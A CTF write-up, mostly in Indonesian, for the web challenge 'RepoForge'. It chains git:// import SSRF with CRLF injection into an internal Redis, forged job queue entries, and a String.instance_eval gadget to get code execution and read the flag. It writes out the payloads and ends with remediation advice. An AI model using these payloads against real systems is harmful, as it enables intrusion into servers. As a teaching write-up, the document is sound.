# CTF Writeup — RepoForge

**Event:** KubSTU CTF  
**Category:** Web  
**Difficulty:** Medium  
**Flag:** `KubSTU{50b900eb985c28468640b012a3edbcec}`

---

## Challenge Description

> RepoForge is a self-hosted code collaboration platform built by ForgeStack Inc. where teams manage repositories, run CI/CD pipelines, and coordinate deployments. The platform offers features similar to GitLab — project management, branch tracking, pipeline visualization, and a background job queue for async tasks like repository imports and webhook deliveries.
>
> As part of a security assessment, you have been given access to a standard user account on the platform. Your objective is to escalate your privileges and achieve remote code execution on the server.
>
> Explore the application carefully. Pay close attention to how the platform handles remote repository imports and what internal services might be accessible from the server. The platform supports multiple import protocols including HTTP, HTTPS, and Git.
>
> The flag is stored in /root/flag.txt and can only be retrieved through code execution on the server.

**URL:** `https://501fe2e0-7eb0-499a-ae91-89f6852600c5.labs.hackadvisor.io/login`

**Credentials:** `user@test.com / password123`

---

## Reconnaissance

### Step 1 — Login and Inspect the Import Feature

Setelah login, fitur yang paling menarik ada di halaman **New Project** pada tab **Import Repository**. Form ini melakukan request ke:

```http
POST /api/projects/import
Content-Type: application/json
```

dengan body:

```json
{"name":"<project-name>","url":"<repository-url>"}
```

Deskripsi challenge juga memberi petunjuk kuat bahwa fitur import repository adalah kunci exploit.

### Step 2 — Test `git://` Import Behavior

RepoForge mengizinkan URL `git://`, jadi saya coba arahkan import ke service internal:

```text
git://0.0.0.0:6379/%0D%0ASMEMBERS%20workers%0D%0A
```

Project hasil import menampilkan log berikut:

```text
Git probe: -ERR unknown command '0037git-upload-pack', with args beginning with: '/'
*1
$19
repoforge-worker:13
```

Ini membuktikan dua hal:

- import `git://` benar-benar membuat koneksi TCP dari server ke host internal
- karakter CRLF di path bisa menyuntikkan command mentah ke service internal

Dengan kata lain, fitur import memberi **raw TCP SSRF / protocol smuggling** ke Redis internal.

### Step 3 — Enumerate Redis

Dengan primitive yang sama, saya enumerasi key Redis:

```text
KEYS *
SMEMBERS queues
LRANGE queue:default 0 10
```

Hasil penting:

- Redis berjalan di `0.0.0.0:6379`
- worker queue yang dipakai adalah `queue:default`
- aplikasi juga memiliki endpoint `/api/jobs` yang menampilkan hasil eksekusi background jobs

Endpoint `/api/jobs` menjadi oracle yang sangat berguna untuk melihat apakah payload queue berhasil diproses atau gagal.

---

## Exploitation

### Step 4 — Confirm Queue Injection

Alih-alih hanya membaca Redis, saya dorong job palsu langsung ke queue:

```redis
RPUSH queue:default {"class":"ZzzProbeWorker","args":["probe"],"jid":"<random>"}
```

Payload ini dikirim sebagai RESP agar Redis memprosesnya dengan benar. Setelah itu, `/api/jobs` menampilkan job gagal dengan `worker_class` yang sama. Artinya:

- queue injection berhasil
- aplikasi benar-benar memproses job dari Redis

### Step 5 — Understand How Jobs Are Executed

Saya kemudian mencoba beberapa class Ruby bawaan seperti `File`, `Kernel`, dan `String`. Hasil di `/api/jobs/<jid>` membocorkan pola eksekusi worker:

```json
{"worker_class":"String","result":"undefined method `abc' for \"\":String"}
```

dan

```json
{"worker_class":"Kernel","result":"undefined method `new' for Kernel:Module"}
```

Dari error ini terlihat worker melakukan sesuatu yang ekuivalen dengan:

```ruby
obj = klass.new
obj.send(args[0], *args[1..])
```

Itu berarti class `String` bisa dijadikan gadget eksekusi Ruby arbitrer, karena:

- `String.new` valid dan menghasilkan string kosong
- string kosong punya method `instance_eval`

### Step 6 — Turn It Into RCE

Saya enqueue job berikut:

```json
{
  "class": "String",
  "args": ["instance_eval", "File.read(\"/root/flag.txt\")"],
  "jid": "<random>"
}
```

Saat job diproses, aplikasi menjalankan:

```ruby
"".instance_eval('File.read("/root/flag.txt")')
```

dan hasilnya muncul langsung di endpoint job detail.

### Step 7 — Retrieve the Flag

Response dari `/api/jobs/<jid>`:

```json
{"jid":"c7d77bf46dffca330d797222","worker_class":"String","status":"completed","result":"KubSTU{50b900eb985c28468640b012a3edbcec}\n","executed_at":"2026-05-01 16:34:39"}
```

---

## Flag

```text
KubSTU{50b900eb985c28468640b012a3edbcec}
```

---

## Vulnerability Summary

| # | Vulnerability | Detail |
|---|---|---|
| 1 | **Git Import TCP SSRF** | `git://` import bisa diarahkan ke service internal dan menerima CRLF injection di path |
| 2 | **Redis Exposed Internally Without Auth** | Redis menerima command mentah dari aplikasi import tanpa autentikasi |
| 3 | **Unsafe Queue Deserialization / Constantization** | Worker class diambil langsung dari data queue dan di-constantize tanpa allowlist ketat |
| 4 | **Dangerous Reflective Dispatch** | Job executor memanggil method dari argumen user-controlled pada object hasil `klass.new` |
| 5 | **Sensitive Job Result Disclosure** | `/api/jobs/<jid>` memantulkan hasil eksekusi job, termasuk output berbahaya |

---

## Remediation

1. **Block internal network access from repository importers** — terutama ke `127.0.0.0/8`, `0.0.0.0`, RFC1918, dan service internal lain
2. **Do not treat `git://` paths as opaque TCP input** — normalisasi dan validasi URL sebelum koneksi dibuat
3. **Protect Redis** — bind ke socket lokal/private interface, aktifkan auth/ACL, dan jangan biarkan service untrusted mengirim command mentah
4. **Use strict worker allowlists** — jangan `constantize` nama class dari payload queue yang bisa dimanipulasi
5. **Avoid dynamic method dispatch from untrusted args** — jangan pernah menjalankan `send(args[0], ...)` pada object buatan attacker
6. **Restrict job introspection endpoints** — `/api/jobs` seharusnya tidak dapat diakses user biasa, apalagi menampilkan hasil eksekusi mentah

---

## Tools Used

- `curl` — enumerasi endpoint dan halaman aplikasi
- Python `requests` — automasi login, queue injection, dan polling hasil job
- Redis RESP payloads via `git://` import — untuk enqueue job berbahaya

---

## Attack Flow

```text
Login as standard user
      │
      ▼
Inspect Import Repository feature
      │
      ▼
Use git://0.0.0.0:6379 with CRLF injection
      │
      ▼
Confirm Redis access via import log
      │
      ▼
RPUSH malicious job into queue:default
      │
      ▼
Observe execution through /api/jobs
      │
      ▼
Discover execution pattern: klass.new + method dispatch
      │
      ▼
Use String.instance_eval as Ruby gadget
      │
      ▼
Execute File.read("/root/flag.txt")
      │
      ▼
Read flag from job result
```
